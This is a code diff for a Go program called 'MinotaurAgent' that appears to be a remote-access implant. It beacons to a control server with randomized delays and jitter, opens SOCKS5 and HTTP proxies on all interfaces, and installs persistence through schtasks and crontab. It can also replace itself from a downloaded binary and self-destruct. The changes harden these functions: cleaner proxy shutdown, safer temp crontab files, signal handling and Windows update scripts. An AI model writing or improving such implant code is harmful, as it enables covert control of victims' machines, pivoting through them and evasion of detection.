@@ -17,10 +17,12 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
+	"os/signal"
 	"path/filepath"
 	"runtime"
 	"strings"
 	"sync"
+	"syscall"
 	"time"
 )
 
@@ -79,6 +81,7 @@ const serverPublicKey = `{{ .ServerPublicKey }}`
 var releaseSingletonLock func()
 
 func init() {
+	rand.Seed(time.Now().UnixNano())
 	tr := &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: config.InsecureTLS},
 	}
@@ -395,6 +398,12 @@ WantedBy=multi-user.target`, absPath)
 
 func startProxy(port string) {
 	addr := "0.0.0.0:" + port
+	listener, err := net.Listen("tcp", addr)
+	if err != nil {
+		logf("Failed to start proxy on %s: %v", addr, err)
+		return
+	}
+
 	ctx, cancel := context.WithCancel(context.Background())
 	proxiesMu.Lock()
 	runningProxies[port] = cancel
@@ -440,42 +449,55 @@ func startProxy(port string) {
 	}
 
 	go func() {
-		logf("HTTP proxy listening on %s", addr)
-		if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
+		if err := server.Serve(listener); err != nil && err != http.ErrServerClosed {
 			logf("Proxy error: %v", err)
 		}
 	}()
 
-	<-ctx.Done()
-	server.Close()
-	logf("HTTP proxy on port %s stopped", port)
+	go func() {
+		<-ctx.Done()
+		server.Close()
+		proxiesMu.Lock()
+		delete(runningProxies, port)
+		proxiesMu.Unlock()
+		logf("HTTP proxy on port %s stopped", port)
+	}()
 }
 
 func startSocks5(port string) {
 	addr := "0.0.0.0:" + port
+	listener, err := net.Listen("tcp", addr)
+	if err != nil {
+		logf("SOCKS5 listen error: %v", err)
+		return
+	}
+
 	ctx, cancel := context.WithCancel(context.Background())
 	proxiesMu.Lock()
 	runningProxies[port] = cancel
 	proxiesMu.Unlock()
 
-	l, err := net.Listen("tcp", addr)
-	if err != nil {
-		logf("SOCKS5 listen error: %v", err)
-		return
-	}
-	defer l.Close()
 	logf("SOCKS5 proxy listening on %s", addr)
 
 	go func() {
 		<-ctx.Done()
-		l.Close()
+		listener.Close()
+		proxiesMu.Lock()
+		delete(runningProxies, port)
+		proxiesMu.Unlock()
 		logf("SOCKS5 proxy on port %s stopped", port)
 	}()
 
 	for {
-		conn, err := l.Accept()
+		conn, err := listener.Accept()
 		if err != nil {
-			return
+			select {
+			case <-ctx.Done():
+				return
+			default:
+				logf("SOCKS5 accept error: %v", err)
+				continue
+			}
 		}
 		go handleSocks5(conn)
 	}
@@ -517,7 +539,7 @@ func handleSocks5(client net.Conn) {
 	port := int(buf[len(buf)-2])<<8 | int(buf[len(buf)-1])
 	target := fmt.Sprintf("%s:%d", targetAddr, port)
 
-	targetConn, err := net.Dial("tcp", target)
+	targetConn, err := net.DialTimeout("tcp", target, 10*time.Second)
 	if err != nil {
 		client.Write([]byte{0x05, 0x01, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
 		return
@@ -591,21 +613,23 @@ func doScheduleWindows(action, name, schedule, command string) string {
 	switch action {
 	case "add":
 		var cmd *exec.Cmd
-		if schedule == "once" {
-			parts := strings.SplitN(schedule, " ", 2)
-			if len(parts) != 2 {
+		if strings.HasPrefix(schedule, "once ") {
+			parts := strings.SplitN(schedule, " ", 3)
+			if len(parts) != 3 {
 				return "Invalid once schedule. Use: once YYYY-MM-DD HH:MM"
 			}
-			cmd = exec.Command("schtasks", "/create", "/tn", name, "/tr", command, "/sc", "once", "/st", parts[1], "/sd", parts[0], "/f")
-		} else if strings.HasPrefix(schedule, "daily") {
+			cmd = exec.Command("schtasks", "/create", "/tn", name, "/tr", command,
+				"/sc", "once", "/st", parts[2], "/sd", parts[1], "/f")
+		} else if strings.HasPrefix(schedule, "daily ") {
 			parts := strings.SplitN(schedule, " ", 2)
 			if len(parts) != 2 {
 				return "Invalid daily schedule. Use: daily HH:MM"
 			}
-			cmd = exec.Command("schtasks", "/create", "/tn", name, "/tr", command, "/sc", "daily", "/st", parts[1], "/f")
+			cmd = exec.Command("schtasks", "/create", "/tn", name, "/tr", command,
+				"/sc", "daily", "/st", parts[1], "/f")
 		} else if schedule == "hourly" {
 			cmd = exec.Command("schtasks", "/create", "/tn", name, "/tr", command, "/sc", "hourly", "/f")
-		} else if strings.HasPrefix(schedule, "minute") {
+		} else if strings.HasPrefix(schedule, "minute ") {
 			parts := strings.SplitN(schedule, " ", 2)
 			if len(parts) != 2 {
 				return "Invalid minute schedule. Use: minute N (N minutes)"
@@ -641,7 +665,6 @@ func doScheduleWindows(action, name, schedule, command string) string {
 
 func doScheduleUnix(action, name, schedule, command string) string {
 	prefix := "# MinotaurAgent: " + name
-	crontabPath := filepath.Join(os.TempDir(), "minotaur_crontab")
 	switch action {
 	case "add":
 		var cronLine string
@@ -668,15 +691,21 @@ func doScheduleUnix(action, name, schedule, command string) string {
 			return "Task already exists"
 		}
 		newCron := current + "\n" + prefix + "\n" + cronLine + "\n"
-		err := os.WriteFile(crontabPath, []byte(newCron), 0600)
+
+		tmpFile, err := os.CreateTemp("", "minotaur_cron_*.txt")
 		if err != nil {
+			return "Failed to create temp file: " + err.Error()
+		}
+		defer os.Remove(tmpFile.Name())
+		if _, err := tmpFile.WriteString(newCron); err != nil {
 			return "Failed to write temp crontab: " + err.Error()
 		}
-		cmd = exec.Command("crontab", crontabPath)
+		tmpFile.Close()
+
+		cmd = exec.Command("crontab", tmpFile.Name())
 		if err := cmd.Run(); err != nil {
 			return "Failed to install crontab: " + err.Error()
 		}
-		os.Remove(crontabPath)
 		return "Cron job added: " + cronLine
 	case "list":
 		cmd := exec.Command("crontab", "-l")
@@ -718,15 +747,21 @@ func doScheduleUnix(action, name, schedule, command string) string {
 			}
 		}
 		newCron := strings.Join(newLines, "\n")
-		err = os.WriteFile(crontabPath, []byte(newCron), 0600)
+
+		tmpFile, err := os.CreateTemp("", "minotaur_cron_*.txt")
 		if err != nil {
+			return "Failed to create temp file: " + err.Error()
+		}
+		defer os.Remove(tmpFile.Name())
+		if _, err := tmpFile.WriteString(newCron); err != nil {
 			return "Failed to write temp crontab: " + err.Error()
 		}
-		cmd = exec.Command("crontab", crontabPath)
+		tmpFile.Close()
+
+		cmd = exec.Command("crontab", tmpFile.Name())
 		if err := cmd.Run(); err != nil {
 			return "Failed to install updated crontab: " + err.Error()
 		}
-		os.Remove(crontabPath)
 		return "Task removed: " + name
 	default:
 		return "Unknown action. Use add, list, remove"
@@ -770,6 +805,10 @@ func selfUpdate(downloadURL string, newVersion string) error {
 		os.Chmod(newExePath, 0755)
 	}
 
+	// Stop all proxies cleanly before replacing binary
+	doProxyStop("all")
+	time.Sleep(500 * time.Millisecond)
+
 	var scriptPath string
 	var scriptContent string
 	if runtime.GOOS == "windows" {
@@ -800,7 +839,11 @@ rm -f "$0"
 	}
 
 	var scriptCmd *exec.Cmd
-	scriptCmd = exec.Command("/bin/sh", scriptPath)
+	if runtime.GOOS == "windows" {
+		scriptCmd = exec.Command("cmd", "/c", scriptPath)
+	} else {
+		scriptCmd = exec.Command("/bin/sh", scriptPath)
+	}
 	if err := scriptCmd.Start(); err != nil {
 		return fmt.Errorf("failed to start update script: %w", err)
 	}
@@ -811,6 +854,9 @@ rm -f "$0"
 
 func selfDestruct() {
 	logf("Self‑destruct initiated")
+	doProxyStop("all")
+	time.Sleep(500 * time.Millisecond)
+
 	if runtime.GOOS == "windows" {
 		exec.Command("schtasks", "/delete", "/tn", "MinotaurAgent", "/f").Run()
 	} else if runtime.GOOS == "linux" {
@@ -1048,6 +1094,16 @@ func main() {
 		}
 	}
 
+	// Optional signal handling for graceful shutdown
+	sigChan := make(chan os.Signal, 1)
+	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
+	go func() {
+		<-sigChan
+		logf("Received termination signal, cleaning up proxies...")
+		doProxyStop("all")
+		os.Exit(0)
+	}()
+
 	for {
 		var sleepDuration time.Duration
 		if config.DebugMode {
@@ -1060,12 +1116,7 @@ func main() {
 			minDelay := 30
 			maxDelay := 300
 			beaconDelay := time.Duration(minDelay+rand.Intn(maxDelay-minDelay+1)) * time.Second
-			maxJitter := 60
-			jitterMax := time.Duration(rand.Intn(maxJitter+1)) * time.Second
-			jitter := time.Duration(0)
-			if jitterMax > 0 {
-				jitter = time.Duration(time.Now().UnixNano() % int64(jitterMax))
-			}
+			jitter := time.Duration(rand.Intn(61)) * time.Second
 			sleepDuration = beaconDelay + jitter
 		}
 		time.Sleep(sleepDuration)
